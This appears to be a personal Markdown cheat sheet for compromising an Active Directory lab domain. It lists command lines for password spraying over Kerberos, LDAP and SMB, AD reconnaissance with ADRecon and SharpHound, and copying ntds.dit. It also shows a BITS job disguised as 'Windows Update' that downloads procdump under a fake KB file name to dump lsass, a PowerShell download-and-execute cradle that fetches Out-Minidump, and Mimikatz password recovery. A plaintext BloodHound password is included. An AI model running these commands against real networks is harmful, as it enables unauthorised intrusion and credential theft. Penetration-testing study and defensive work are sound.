<H1>Exploit AD</H1>


- [Pentest](#pentest)
  - [Information Gathering](#information-gathering)
  - [Password Attack (Spraying)](#password-attack-spraying)
    - [Domain to Hostfile](#domain-to-hostfile)
    - [Kerberos](#kerberos)
    - [LDAP](#ldap)
    - [SMB](#smb)
- [Post exploit](#post-exploit)
  - [Information Gathering Tools](#information-gathering-tools)
    - [ADRecon](#adrecon)
    - [SharpHound && BloodHound](#sharphound--bloodhound)
  - [Get domain name](#get-domain-name)
  - [Remote](#remote)
    - [Path](#path)
    - [Command](#command)
  - [DC list](#dc-list)
  - [Domain Scan](#domain-scan)
  - [Dump password](#dump-password)
    - [Recover password (Attacker machine)](#recover-password-attacker-machine)
  - [SharpHound](#sharphound)
  - [BloodHound](#bloodhound)
    - [csv To json](#csv-to-json)


# Pentest 



## Information Gathering 

Get a list of username form domain [link](https://hunter.io/)



Scan: 

    nmap -F pentest.lab

## Password Attack (Spraying)

Password List :

- Spring19
- Summer19
- Winter19
- Autunm19



### Domain to Hostfile 


Path: `C:\Windows\System32\Drivers\etc\hosts`

Data: `192.168.1.81   pentest.lab`
          


### Kerberos

    cd /usr/share/kerbrute
    kerbrute passwordspray /usr/share/seclist/Usernames/cirt-default-usernames.txt -d pentest.lab --dc 192.168.1.81 Summer19


### LDAP
    ldapsearch -H ldap://192.168.1.81/ -x -LLL -b "CN=bob,CN=Users,DC=pentest,DC=lab"

    patator ldap_login host=192.168.1.81 binddn="CN=FILE0,CN=Users,DC=pentest,DC=lab" bindpw='Summer19' 0=test.lst
    patator ldap_login host=192.168.1.81 binddn="CN=FILE0,CN=Users,DC=pentest,DC=lab" bindpw='Summer19' 0=/usr/share/seclist/Usernames/cirt-default-usernames.txt



to test 
    nmap -p 389 --script ldap-brute --script-args ldap.base='"CN=Users,DC=pentest,DC=lab"' 192.168.1.81

### SMB
    patator smb_login host=192.168.1.81 user=FILE0 0=test.lst password=Spring19


msfconsole

    msf > use auxiliary/scanner/smb/smb_login

    




# Post exploit


## Information Gathering Tools

### ADRecon

*Requist user and password !* 


Commands:

    powershell -ex bypass
    Import-Module .\ADRecon.ps1

    .\ADRecon.ps1 -Protocol LDAP -DomainController 192.168.1.81 -Credential pentest.lab\bob


    .\ADRecon.ps1 -Protocol ADWS -DomainController 192.168.1.81 -Credential pentest.lab\bob -Collect Domian, DCs



[Tools link (Git)](https://github.com/sense-of-security/ADRecon)


### SharpHound && BloodHound

    SharpHound.exe --Domain pentest.lab --DomainController 192.168.1.81 --LdapUser bob --LdapPass Summer19 -c All


    SharpHound.exe --Domain pentest.lab --DomainController 192.168.1.81 --LdapUser bob --LdapPass Summer19


    SharpHound.exe --CollectionMethod Session --Stealth







## Get domain name 

    wmic computersystem get domain
    or
    gpresult /R


## Remote 

### Path 

    \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\


File:
- groups.xml
- scheduledtasks.xml
- Services.xml

### Command


Info

    net user \<DOMAIN>

    dir \\<IP_ADDRESSS>\sysvol

    copy \\<IP_ADDRESSS>\c$\temp\ntds.dit C:\temp

Remote command  

    wmic /node:dc /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "cmd /c systeminfo"

    runas.exe /netonly /user:<DOMAIN>\<USERNAME> cmd.exe


## DC list 

    nltest /dclist:pentest.lab

## Domain Scan 

    1..254 | % { nslookup 192.168.1."$_"}




## Dump password

    bitsadmin /Create "Windows Update" 
    bitsadmin /AddFile "Windows Update" https://live.sysinternals.com/Procdump.exe %TEMP%\kb7468656d.exe 
    bitsadmin /SetNotifyFlags "Windows Update" 1
    bitsadmin /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B %TEMP%\kb7468656d.exe -accepteula -ma lsass.exe  %temp%\lsassdump"
    bitsadmin /Resume "Windows Update" 


    net use Z: https://live.sysinternals.com
    Z:\procdump.exe -accepteula -ma lsass.exe  %temp%\lsassdump



    or 
        psexec.exe

        https://live.sysinternals.com/psexec.exe


        psexec.exe -i -s lsass.exe
        

### Recover password (Attacker machine)

Mimikatz.exe

        Mimikatz "sekurlsa::minidump lsass.dmp"
        sekurlsa::LogonPasswords

vol.exe

    set plugin=C:\Users\Admin\Desktop\My doc\sysExec\plugin
    volatility --plugins=%plugin%/mimikatz.pyâ€” profile=Win7SP0x86 -f halomar.dmp mimikatz






    powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump"



    https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1



    https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf





## SharpHound


## BloodHound

Admin password 
    sudo systemctl start noe4j
    bloodhound

    http://localhost:7474


        BloodHound 
        35cgLuH4UgnvATFBxR5fUr2E


./csvtojson.sh /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/Computers.csv 

/tmp/csv-to-json-converter $ ./csvtojson.sh /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/Computers.csv


### csv To json
    git clone https://github.com/satwik77/csv-to-json-converter.git
    
    csvtojson="/tmp/csv-to-json-converter/csvtojson.sh"

    cd /home/bob/Desktop/AdInfo/ADRecon-Report-20190818174711/CSV-Files/
    mkdir out
    for f in *.csv; do echo "Processing $f file.. =>  $f.json" && $csvtojson $f > out/$f.json; done